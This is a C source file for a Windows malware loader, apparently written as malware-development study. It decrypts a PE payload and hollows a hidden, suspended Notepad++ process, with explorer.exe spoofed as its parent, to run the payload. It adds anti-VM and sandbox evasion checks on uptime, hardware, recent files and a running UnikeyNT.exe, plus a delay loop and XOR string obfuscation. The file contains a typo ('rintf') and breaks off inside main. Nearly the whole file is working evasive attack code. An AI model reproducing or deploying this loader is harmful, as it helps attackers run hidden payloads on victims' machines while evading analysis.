#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <time.h>
#include <stdio.h>
#include "struct.h"
#include "cipher.h"
#include "resource.h"


#pragma comment(lib, "WindowsApp.lib")
#pragma warning (disable:4996)
//#define VMCHECK
#define DEBUG
#define TARGET_PROCESS_NAME          L"\\??\\C:\\Program Files\\Notepad++\\notepad++.exe"
#define TARGET_PROCESS_PARAMETERS L" \"C:\\Program Files\\Notepad++\\notepad++.exe\" \"C:\\Users\\Acer\\Desktop\\Final Test.docx\""
#define TARGET_PROCESS_PATH          L"C:\\Program Files\\Notepad++"
#define PAYLOAD                        "E:\\Study\\Malware Dev\\data2.kiendt"
//#define PAYLOAD2                      MAKEINTRESOURCE(101) // Resource ID for the embedded payload


// Extract embedded payload from resource
#ifdef LOADSRSC
BOOL ExD(OUT BYTE** ppPayload, OUT DWORD* pSize) {
	HMODULE hModule = GetModuleHandle(NULL);
	if (!hModule) return FALSE;
	printf("[i] Module handle obtained successfully.\n");

	HRSRC hRes = FindResource(hModule, PAYLOAD, RT_GROUP_ICON);
	if (!hRes) {
		printf("[-] FindResource failed: %lu\n", GetLastError());
		return FALSE;
	}
	printf("[i] Resource found successfully.\n");
	printf("[i] Resource ID: %d, Type: %s\n", (int)hRes, RT_GROUP_ICON);
	HGLOBAL hResData = LoadResource(hModule, hRes);
	if (!hResData) return FALSE;
	printf("[i] Resource loaded successfully.\n");

	DWORD resSize = SizeofResource(hModule, hRes);
	if (resSize == 0) {
		printf("[-] SizeofResource returned 0.\n");
		return FALSE;
	}
	printf("[i] Resource size: %lu bytes.\n", resSize);

	BYTE* pData = (BYTE*)LockResource(hResData);
	if (!pData || resSize <= SIGNATURE_LEN) return FALSE;
	printf("[i] Resource data locked successfully.\n");
	
	//print hex data of pData
	for (DWORD i = 0; i < resSize; ++i) {
		printf("%02X ", pData[i]);
		if ((i + 1) % 16 == 0) printf("\n");
	}

	// Search for the signature
	for (DWORD i = 0; i <= resSize - SIGNATURE_LEN; ++i) {
	//	// Check if the current position matches the signature
	//	
		if (memcmp(&pData[i], SIGNATURE, SIGNATURE_LEN) == 0) {
			DWORD payloadOffset = i;
			DWORD payloadSize = resSize - payloadOffset;

			BYTE* decrypted = NULL;
			DWORD decryptedSize = 0;
			if (!Decryption(&pData[payloadOffset], payloadSize, Key, IV, (PVOID*)&decrypted, &decryptedSize)) {
				printf("[-] Decryption failed.\n");
				return FALSE;
			}
			printf("[i] Signature found at offset %lu, decrypted size: %lu bytes.\n", payloadOffset, decryptedSize);

			*ppPayload = decrypted;
			*pSize = decryptedSize;
			return TRUE;
		}
	}

	return FALSE; // Signature not found
}
#endif // LOADSRSC

BOOL MathDelayFunction(IN double elapse_tm) {
	clock_t start_time = clock();
	double pi = 0.0;
	int iterations = 0;
	const double target_time = elapse_tm * CLOCKS_PER_SEC;

	while ((double)(clock() - start_time) / CLOCKS_PER_SEC < 10.0) {
		pi += (iterations % 2 == 0 ? 1.0 : -1.0) / (2.0 * iterations + 1);
		iterations++;
	}
	pi *= 4.0; // Approximate π

#ifdef DEBUG
	printf("[i] MathDelayFunction completed, pi approximation: %.10f, iterations: %d, elapsed time: %.2f seconds\n",
		pi, iterations, (double)(clock() - start_time) / CLOCKS_PER_SEC);
#endif // DEBUG

	return TRUE;
}

LPCSTR StringObf(IN LPCSTR cString) {
	LPCSTR cKey = "MicrosoftInc";
	size_t len = strlen(cString);
	char* result = (char*)malloc(len + 1);
	if (!result) return NULL;

	for (size_t i = 0; i < len; i++) {
		result[i] = cString[i] ^ cKey[i % strlen(cKey)];
	}
	result[len] = '\0';
	return result;
}

BOOL HardwareChk() {
	// Get CPU count
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
#ifdef DEBUG
	printf("[i] Number of Processors: %u\n", systemInfo.dwNumberOfProcessors);
#endif // DEBUG

	if (systemInfo.dwNumberOfProcessors < 2)
		return FALSE;

	// Get RAM size
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	if (!GlobalMemoryStatusEx(&memoryStatus))
		return FALSE;

	DWORD RAMMB = (DWORD)(memoryStatus.ullTotalPhys / 1024 / 1024);
#ifdef DEBUG
	printf("[i] Total RAM Size: %u MB\n", RAMMB);
#endif // DEBUG

	if (RAMMB < 2048)
		return FALSE;

	// Get disk size
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
		return FALSE;

	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	BOOL result = DeviceIoControl(
		hDevice,
		IOCTL_DISK_GET_DRIVE_GEOMETRY,
		NULL,
		0,
		&pDiskGeometry,
		sizeof(pDiskGeometry),
		&bytesReturned,
		NULL
	);

	CloseHandle(hDevice);

	if (!result)
		return FALSE;

	ULONGLONG diskSizeGB = pDiskGeometry.Cylinders.QuadPart *
		(ULONG)pDiskGeometry.TracksPerCylinder *
		(ULONG)pDiskGeometry.SectorsPerTrack *
		(ULONG)pDiskGeometry.BytesPerSector;

	diskSizeGB /= (1024ULL * 1024 * 1024);
#ifdef DEBUG
	printf("[i] Total Disk Size: %llu GB\n", diskSizeGB);
#endif // DEBUG

	if (diskSizeGB < 100)
		return FALSE;

	return TRUE;
}

VOID PrintOutput(IN HANDLE StdOutRead) {
	DWORD dwAvailableBytes = 0x00;
	PBYTE pBuffer = 0x00;
	BOOL bSTATE = TRUE;
	do {
		DWORD dwAvailableBytes = 0x00;
		PBYTE pBuffer = 0x00;
		PeekNamedPipe(StdOutRead, NULL, NULL, NULL, &dwAvailableBytes, NULL);
		pBuffer = (PBYTE)LocalAlloc(LPTR, (SIZE_T)dwAvailableBytes);
		if (!pBuffer)
			break;
		if (!(bSTATE = ReadFile(StdOutRead, pBuffer, dwAvailableBytes, NULL, NULL))) {
			LocalFree(pBuffer);
			break;
		} 
			rintf(pBuffer);
		LocalFree(pBuffer);
	} while (bSTATE);
}

// ===========================================================================================================================================================
VOID _RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

	if ((UsStruct->Buffer = (PWSTR)Buffer)) {

		unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
		if (Length > 0xfffc)
			Length = 0xfffc;

		UsStruct->Length = Length;
		UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
	}

	else UsStruct->Length = UsStruct->MaximumLength = 0;
}

// ===========================================================================================================================================================
DWORD GetProcessIdByName(IN LPCWSTR cProcessName) {
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32W pe32 = { 0 };
	DWORD dwProcessId = 0x00;
	// Create a snapshot of all processes in the system
	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0x00)) == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINT_WINAPI_ERR("CreateToolhelp32Snapshot");
#endif // DEBUG
		return 0x00;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32W);
	// Iterate through the processes in the snapshot
	if (Process32FirstW(hSnapshot, &pe32)) {
		do {
			if (_wcsicmp(pe32.szExeFile, cProcessName) == 0) {
				dwProcessId = pe32.th32ProcessID; // Found the process
				break;
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}
	CloseHandle(hSnapshot);
	return dwProcessId; // Return the process ID or 0 if not found
}

// ===========================================================================================================================================================
BOOL ReadFileFromDisk(IN LPCSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize) {

	HANDLE	hFile = INVALID_HANDLE_VALUE;
	PBYTE	pBufer = NULL;
	DWORD	dwFileSize = 0x00,
		dwNumberOfBytesRead = 0x00;

	if ((hFile = CreateFileA(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		PRINT_WINAPI_ERR("CreateFileA");
		goto _FUNC_CLEANUP;
	}

	if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
		PRINT_WINAPI_ERR("GetFileSize");
		goto _FUNC_CLEANUP;
	}

	if ((pBufer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
		PRINT_WINAPI_ERR("HeapAlloc");
		goto _FUNC_CLEANUP;
	}

	if (!ReadFile(hFile, pBufer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
		PRINT_WINAPI_ERR("ReadFile");
		goto _FUNC_CLEANUP;
	}


	if (!Decryption(pBufer, dwFileSize, Key, IV, (PVOID*)ppBuffer, pdwFileSize)) {
		PRINT_WINAPI_ERR("Decryption");
		goto _FUNC_CLEANUP;
	}


_FUNC_CLEANUP:
	if (hFile != INVALID_HANDLE_VALUE)
		CloseHandle(hFile);
	if (!*ppBuffer && pBufer)
		HeapFree(GetProcessHeap(), 0x00, pBufer);
	return ((*ppBuffer != NULL) && (*pdwFileSize != 0x00)) ? TRUE : FALSE;
}

// ===========================================================================================================================================================
BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {

	// Loop through each section of the PE image.
	for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {

		// Variables to store the new and old memory protections.
		DWORD	dwProtection = 0x00,
				dwOldProtection = 0x00;

		// Skip the section if it has no data or no associated virtual address.
		if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress)
			continue;

		// Determine memory protection based on section characteristics.
		// These characteristics dictate whether the section is readable, writable, executable, etc.
		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
			dwProtection = PAGE_WRITECOPY;

		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
			dwProtection = PAGE_READONLY;
	

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_READWRITE;


		if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
			dwProtection = PAGE_EXECUTE;


		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
			dwProtection = PAGE_EXECUTE_WRITECOPY;
	
		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READ;
	

		if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
			dwProtection = PAGE_EXECUTE_READWRITE;
		

		// Apply the determined memory protection to the section.
		if (!VirtualProtectEx(hProcess, (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
			PRINT_WINAPI_ERR("VirtualProtectEx");
			return FALSE;
		}
	}

	return TRUE;
}

// ===========================================================================================================================================================
BOOL CreateTheHollowedProcess(IN HANDLE hParentProcess,OUT PPROCESS_INFORMATION pProcessInfo,OUT HANDLE* pStdInWrite,OUT HANDLE* pStdOutRead,OUT PHANDLE hProcess,OUT PHANDLE hThread){
	PWSTR szTargetProcess = TARGET_PROCESS_NAME,
		  szTargetProcessParameters = TARGET_PROCESS_PARAMETERS,
		  szTargetProcessPath = TARGET_PROCESS_PATH;

	STARTUPINFO StartupInfo = { 0 };
	SECURITY_ATTRIBUTES SecAttr = { 0 };
	HANDLE StdInRead = NULL, StdInWriteTemp = NULL;
	HANDLE StdOutReadTemp = NULL, StdOutWrite = NULL;
	BOOL bSTATE = FALSE;

	NTSTATUS STATUS = 0;
	UNICODE_STRING UsNtImagePath = { 0 },
		UsCommandLine = { 0 },
		UsCurrentDirectory = { 0 };

	PRTL_USER_PROCESS_PARAMETERS UppProcessParameters = NULL;

	// Allocate space for 2 attributes
	const DWORD attrCount = 2;
	DWORD attrListSize = sizeof(PS_ATTRIBUTE_LIST) + (attrCount - 1) * sizeof(PS_ATTRIBUTE);
	PPS_ATTRIBUTE_LIST pAttributeList = (PPS_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrListSize);
	if (!pAttributeList) return FALSE;

	// Load functions
	fnRtlCreateProcessParametersEx RtlCreateProcessParametersEx =
		(fnRtlCreateProcessParametersEx)GetProcAddress(GetModuleHandleW(L"ntdll"), "RtlCreateProcessParametersEx");
	fnNtCreateUserProcess NtCreateUserProcess =
		(fnNtCreateUserProcess)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtCreateUserProcess");
	if (!RtlCreateProcessParametersEx || !NtCreateUserProcess) {
		goto _FUNC_CLEANUP;
	}

	// Init UNICODE_STRINGs
	_RtlInitUnicodeString(&UsNtImagePath, szTargetProcess);
	_RtlInitUnicodeString(&UsCommandLine, szTargetProcessParameters);
	_RtlInitUnicodeString(&UsCurrentDirectory, szTargetProcessPath);

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

	// Setup SECURITY_ATTRIBUTES
	SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecAttr.bInheritHandle = TRUE;
	SecAttr.lpSecurityDescriptor = NULL;

	// Create anonymous pipes
	if (!CreatePipe(&StdInRead, &StdInWriteTemp, &SecAttr, 0)) {
		goto _FUNC_CLEANUP;
	}
	if (!CreatePipe(&StdOutReadTemp, &StdOutWrite, &SecAttr, 0)) {
		goto _FUNC_CLEANUP;
	}

	// Set up STARTUPINFO
	StartupInfo.cb = sizeof(STARTUPINFO);
	StartupInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow = SW_HIDE;
	StartupInfo.hStdInput = StdInRead;
	StartupInfo.hStdOutput = StdOutWrite;
	StartupInfo.hStdError = StdOutWrite;

	// Create process parameters
	STATUS = RtlCreateProcessParametersEx(
		&UppProcessParameters,
		&UsNtImagePath,
		NULL,
		&UsCurrentDirectory,
		&UsCommandLine,
		NULL, NULL, NULL, NULL, NULL,
		RTL_USER_PROC_PARAMS_NORMALIZED
	);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] RtlCreateProcessParametersEx Failed With Error: 0x%08X\n", STATUS);
		goto _FUNC_CLEANUP;
	}

	// Setup attribute list
	pAttributeList->TotalLength = attrListSize;

	pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	pAttributeList->Attributes[0].Size = UsNtImagePath.Length;
	pAttributeList->Attributes[0].Value = (ULONG_PTR)UsNtImagePath.Buffer;

	pAttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	pAttributeList->Attributes[1].Size = sizeof(HANDLE);
	pAttributeList->Attributes[1].Value = (ULONG_PTR)hParentProcess;

	// Setup PS_CREATE_INFO
	PS_CREATE_INFO psCreateInfo = { 0 };
	psCreateInfo.Size = sizeof(PS_CREATE_INFO);
	psCreateInfo.State = PsCreateInitialState;

	// Create the process (suspended)
	STATUS = NtCreateUserProcess(
		hProcess,
		hThread,
		PROCESS_ALL_ACCESS,
		THREAD_ALL_ACCESS,
		NULL, NULL,
		PROCESS_CREATE_FLAGS_SUSPENDED,
		THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
		UppProcessParameters,
		&psCreateInfo,
		pAttributeList
	);
	if (!NT_SUCCESS(STATUS)) {
		printf("[!] NtCreateUserProcess Failed With Error: 0x%08X\n", STATUS);
		goto _FUNC_CLEANUP;
	}

#ifdef DEBUG
	// Print process information
	printf("[*] Hollowed Process Created With PID: %d\n", GetProcessId(*hProcess));
	getchar(); // Wait for user input to continue
#endif // DEBUG

	// Success
	*pStdInWrite = StdInWriteTemp;
	*pStdOutRead = StdOutReadTemp;
	bSTATE = TRUE;

_FUNC_CLEANUP:
	// Clean up unused pipe ends
	if (StdInRead) CloseHandle(StdInRead);
	if (StdOutWrite) CloseHandle(StdOutWrite);

	if (!bSTATE) {
		if (StdInWriteTemp) CloseHandle(StdInWriteTemp);
		if (StdOutReadTemp) CloseHandle(StdOutReadTemp);
	}

	if (UppProcessParameters)
		RtlDestroyProcessParameters(UppProcessParameters);

	if (pAttributeList)
		HeapFree(GetProcessHeap(), 0, pAttributeList);

	return bSTATE;
}

// ===========================================================================================================================================================
BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx) {
	NTSTATUS status;
	ULONG_PTR	uRemoteImageBaseOffset = 0x00,
		uRemoteImageBase = 0x00;

	SIZE_T		NumberOfBytesRead = 0x00,
		NumberOfBytesWritten = 0x00;

	NtWriteVirtualMemory WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	if (!WriteVirtualMemory) {
#ifdef DEBUG
		PRINT_WINAPI_ERR("GetProcAddress(NtWriteVirtualMemory)");
#endif // DEBUG
		return FALSE;
	}


	// Get the offset of the ImageBaseAddress in the PEB structure
	// Context.Rdx is PPEB
	// Context.Rdx + offsetof(PEB, Reserved3[1])) is PPEB->Reserved3[1], which is ImageBaseAddress
	uRemoteImageBaseOffset = (PVOID)(Rdx + offsetof(PEB, Reserved3[1]));
	
	// Reading the original image base address
	if (!ReadProcessMemory(hProcess, uRemoteImageBaseOffset, &uRemoteImageBase, sizeof(PVOID), &NumberOfBytesRead) || sizeof(PVOID) != NumberOfBytesRead){
		PRINT_WINAPI_ERR("ReadProcessMemory");
		return FALSE;
	}
#ifdef DEBUG
	printf("[i] Replacing Original Image Address From %p To %p ... \n", (void*)uRemoteImageBase, (void*)uPeBaseAddress);
#endif // DEBUG


	status = WriteVirtualMemory(
		hProcess,                            // Handle to the process
		(PVOID)uRemoteImageBaseOffset,       // Base address of the section
		&uPeBaseAddress,                     // Pointer to the data to write
		sizeof(PVOID),                       // Size of the data to write
		&NumberOfBytesWritten                 // Number of bytes written
	);
	if (status != 0x00 || sizeof(PVOID) != NumberOfBytesWritten) {
#ifdef DEBUG	
		printf("[+] DONE \n");
#endif
		DELETE_HANDLE(hProcess);
		return FALSE; // If the memory write fails, return FALSE.
	}
	return TRUE;
}


BOOL RemotePEExec(IN HANDLE hParentProcess, IN PBYTE pPeBuffer, IN DWORD dwImageSize) {
	if (!pPeBuffer || dwImageSize == 0) {
#ifdef DEBUG
		printf("[-] Invalid PE Buffer or image size.\n");
#endif
		return FALSE;
	}

	PROCESS_INFORMATION ProcessInfo = { 0 };
	CONTEXT Context = { .ContextFlags = CONTEXT_ALL };
	HANDLE StdInWrite = NULL, StdOutRead = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_SECTION_HEADER pSectionHeaders = NULL;
	NTSTATUS status = 0;
	BOOL bSTATE = FALSE;

	// Resolve ntdll functions
	NtAllocateVirtualMemory AllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtAllocateVirtualMemory");
	NtWriteVirtualMemory WriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtWriteVirtualMemory");

	if (!AllocateVirtualMemory || !WriteVirtualMemory) {
#ifdef DEBUG
		printf("[-] Failed to resolve required Nt* functions.\n");
#endif
		return FALSE;
	}

	// Create hollowed process
	if (!CreateTheHollowedProcess(hParentProcess, &ProcessInfo, &StdInWrite, &StdOutRead, &ProcessInfo.hProcess, &ProcessInfo.hThread)) {
#ifdef DEBUG
		printf("[-] Failed to create the hollowed process.\n");
#endif
		return FALSE;
	}

	// Parse PE headers
	pNtHeaders = (PIMAGE_NT_HEADERS)(pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
#ifdef DEBUG
		printf("[-] Invalid NT signature in PE buffer.\n");
#endif
		goto _FUNC_CLEANUP;
	}

	SIZE_T sizeOfImage = pNtHeaders->OptionalHeader.SizeOfImage;
	PVOID pRemoteAddress = (PVOID)pNtHeaders->OptionalHeader.ImageBase;
	status = AllocateVirtualMemory(
		ProcessInfo.hProcess,
		&pRemoteAddress,
		0,
		&sizeOfImage,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	if (!NT_SUCCESS(status) || !pRemoteAddress) {
#ifdef DEBUG
		printf("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
#endif
		goto _FUNC_CLEANUP;
	}

	//if (!(pRemoteAddress = VirtualAllocEx(ProcessInfo.hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, (SIZE_T)pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
	//	PRINT_WINAPI_ERR("VirtualAllocEx");
	//	goto _FUNC_CLEANUP;
	//} //NtAllocateVirtualMemory

	printf("[*] Remote Image Base Address: 0x%p\n", pRemoteAddress);
	printf("[i] Preferable Base Address: 0x%p\n", (LPVOID)pNtHeaders->OptionalHeader.ImageBase);


	// Write PE headers
	status = WriteVirtualMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
	if (!NT_SUCCESS(status)) {
#ifdef DEBUG
		printf("[-] Failed to write PE headers: 0x%X\n", status);
#endif
		goto _FUNC_CLEANUP;
	}

	// Write PE sections
	pSectionHeaders = IMAGE_FIRST_SECTION(pNtHeaders);
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		if (pSectionHeaders[i].PointerToRawData + pSectionHeaders[i].SizeOfRawData > dwImageSize) {
#ifdef DEBUG
			printf("[-] Section %s exceeds file size.\n", pSectionHeaders[i].Name);
#endif
			goto _FUNC_CLEANUP;
		}

		status = WriteVirtualMemory(
			ProcessInfo.hProcess,
			(PVOID)((ULONG_PTR)pRemoteAddress + pSectionHeaders[i].VirtualAddress),
			pPeBuffer + pSectionHeaders[i].PointerToRawData,
			pSectionHeaders[i].SizeOfRawData,
			NULL
		);

		if (!NT_SUCCESS(status)) {
#ifdef DEBUG
			printf("[-] Failed to write section %s: 0x%X\n", pSectionHeaders[i].Name, status);
#endif
			goto _FUNC_CLEANUP;
		}
#ifdef DEBUG
		printf("[+] Wrote section %s to %p (%u bytes)\n", pSectionHeaders[i].Name,
			(PVOID)((ULONG_PTR)pRemoteAddress + pSectionHeaders[i].VirtualAddress),
			pSectionHeaders[i].SizeOfRawData);
#endif
	}

	// Get thread context
	if (!GetThreadContext(ProcessInfo.hThread, &Context)) { // ZwGetContextThread
		PRINT_WINAPI_ERR("GetThreadContext");
		goto _FUNC_CLEANUP;
	}

	// Patch PEB ImageBaseAddress
	if (!ReplaceBaseAddressImage(ProcessInfo.hProcess, pRemoteAddress, Context.Rdx)) {
#ifdef DEBUG
		printf("[-] ReplaceBaseAddressImage failed.\n");
#endif
		goto _FUNC_CLEANUP;
	}

	// Fix memory permissions
	if (!FixMemPermissionsEx(ProcessInfo.hProcess, pRemoteAddress, pNtHeaders, pSectionHeaders)) {
		goto _FUNC_CLEANUP;
	}

#ifdef DEBUG
	printf("[i] Press <Enter> to execute EntryPoint...\n");
	getchar();
#endif

	// Set EntryPoint (RCX = RtlUserThreadStart's entry)
	Context.Rcx = (DWORD64)((ULONG_PTR)pRemoteAddress + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
	if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
		PRINT_WINAPI_ERR("SetThreadContext");
		goto _FUNC_CLEANUP;
	}
	BOOL nothing = MathDelayFunction(1.0);
	// Resume thread and execute
	if (ResumeThread(ProcessInfo.hThread) == (DWORD)-1) {
#ifdef DEBUG
		PRINT_WINAPI_ERR("ResumeThread");
#endif
		goto _FUNC_CLEANUP;
	}

#ifdef DEBUG
	printf("[+] Thread resumed at EntryPoint: %p\n", (PVOID)Context.Rcx);
#endif

	// Wait for completion
	WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

#ifdef DEBUG
	printf("[*] Reading output...\n\n");
	PrintOutput(StdOutRead);
	getchar();
#endif

	bSTATE = TRUE;

_FUNC_CLEANUP:
	DELETE_HANDLE(StdInWrite);
	DELETE_HANDLE(StdOutRead);
	DELETE_HANDLE(ProcessInfo.hProcess);
	DELETE_HANDLE(ProcessInfo.hThread);
	return bSTATE;
}


// ===========================================================================================================================================================
int main() {
	HANDLE hParentProcess = NULL;
	HANDLE hProcess = NULL, hThread = NULL;
	PROCESS_INFORMATION ProcessInfo = { 0 };
	HANDLE hStdInWrite = NULL, hStdOutRead = NULL;

#ifdef VMCHECK

	PWSTR recentPath = NULL;
	HRESULT hr = SHGetKnownFolderPath(&FOLDERID_Recent, 0, NULL, &recentPath);

	if (FAILED(hr)) {
		printf("[-] Failed to get Recent folder path. HRESULT: 0x%08lx\n", hr);
		return TRUE;
	}

	// Convert wide path to normal string with wildcard
	wchar_t searchPath[MAX_PATH];
	wsprintfW(searchPath, L"%s\\*", recentPath);
#ifdef DEBUG
	wprintf(L"[i] Recent Path: %s\n", recentPath);
#endif // DEBUG


	WIN32_FIND_DATAW findFileData;
	HANDLE hFind = FindFirstFileW(searchPath, &findFileData);
	if (hFind == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		printf("[-] FindFirstFile failed. Error: %lu\n", GetLastError());
#endif // DEBUG
		CoTaskMemFree(recentPath);
		return TRUE;
	}

	int fileCount = 0;
	do {
		// Skip "." and ".."
		if (wcscmp(findFileData.cFileName, L".") == 0 || wcscmp(findFileData.cFileName, L"..") == 0)
			continue;

		// Count only files
		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			fileCount++;
		}
	} while (FindNextFileW(hFind, &findFileData));

	FindClose(hFind);
	CoTaskMemFree(recentPath);

#ifdef DEBUG
	wprintf(L"[+] Total files in Recent folder: %d\n", fileCount);
#endif
	if (fileCount < 150) {
		// Less than 150 files, exit
#ifdef DEBUG
		printf("[-] Possible VM.\n");
#endif
		return TRUE;
	}
 


	DWORD SB_Check = GetProcessIdByName(L"UnikeyNT.exe");
	printf("[i] Checking if UnikeyNT.exe is running...\n");
	// Check if UnikeyNT.exe is not running
	if (SB_Check == 0x00) {
#ifdef DEBUG
		printf("[-] UnikeyNT.exe is not running. Might be VM.\n");
		printf("[!] Press <anything> to exit!\n");
		getchar(); // Wait for user input to exit
#endif // DEBUG
		return TRUE;
	}

	// Get system uptime
	ULONGLONG uptimeMilliseconds = GetTickCount64();
	ULONGLONG uptimeSeconds = uptimeMilliseconds / 1000;
	ULONGLONG uptimeMinutes = uptimeSeconds / 60;
	ULONGLONG uptimeHours = uptimeMinutes / 60;

#ifdef DEBUG
	printf("[i] System Uptime: %llu hours, %llu minutes, %llu seconds\n", uptimeHours, uptimeMinutes % 60, uptimeSeconds % 60);
#endif // DEBUG
	// Check if uptime is less than 1 hour
	
	if (uptimeMinutes < 30) {
#ifdef DEBUG
		printf("[-] System uptime is less than 30 Minutes. Might be VM.\n");
		printf("			[!] Press <anything> to exit!\n");
		getchar(); // Wait for user input to exit	
#endif // DEBUG
		return TRUE;
	}

	// Check hardware specifications
	if (!HardwareChk()) {
#ifdef DEBUG
		printf("[-] Hardware specifications do not meet the requirements. Might be VM.\n");
		printf("			[!] Press <anything> to exit!\n");
		getchar(); // Wait for user input to exit
#endif // DEBUG
		return TRUE;
	}
	// Get Process ID by name

#endif 


	DWORD PARENT_PID = GetProcessIdByName(L"explorer.exe"); 
	if (PARENT_PID == 0x00) {
#ifdef DEBUG
		printf("[-] Failed to find the parent process (explorer.exe). Make sure it is running.");
#endif // DEBUG
		return TRUE;
	}
#ifdef DEBUG
	printf("[i] Parent Process PID: %d \n[!] Press <anything> to continue", PARENT_PID);
	getchar(); // Wait for user input to continue
#endif // DEBUG


	// Open the parent process
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PARENT_PID);
#ifdef DEBUG
	printf("[i] Opening Parent Process with PID: %d ...\n", PARENT_PID);
#endif // DEBUG

	
	if (hParentProcess == NULL) {
#ifdef DEBUG
		PRINT_WINAPI_ERR("OpenProcess");
#endif
		return TRUE;
	}

	// Read the PE file from disk
	PBYTE pPeBuffer = NULL;
	DWORD dwPeFileSize = 0;

	if (!ReadFileFromDisk(PAYLOAD, &pPeBuffer, &dwPeFileSize)) {
#ifdef DEBUG
		printf("[-] Failed to read the PE file from disk.\n");
#endif // DEBUG
		DELETE_HANDLE(hParentProcess);
		return -1;
	}

	// Extract resource payload
#ifdef LOADSRSC
	if (!ExD(&pPeBuffer, &dwPeFileSize)) {
#ifdef DEBUG
		printf("[-] Failed to extract resource payload.\n");
#endif // DEBUG
		DELETE_HANDLE(hParentProcess);
		if (pPeBuffer) {
			HeapFree(GetProcessHeap(), 0, pPeBuffer);
		}
		return -1;
	}
#endif // LOADSRSC


#ifdef DEBUG
	// Print number of bytes read 
	printf("[i] Read %llu bytes from the PE file.\n", (unsigned long)dwPeFileSize);
#endif // DEBUG


	// PeExecution
	if (!RemotePEExec(hParentProcess, pPeBuffer, dwPeFileSize)) {
#ifdef DEBUG
		printf("[-] RemotePEExec failed.\n");
#endif // DEBUG
		DELETE_HANDLE(hParentProcess);
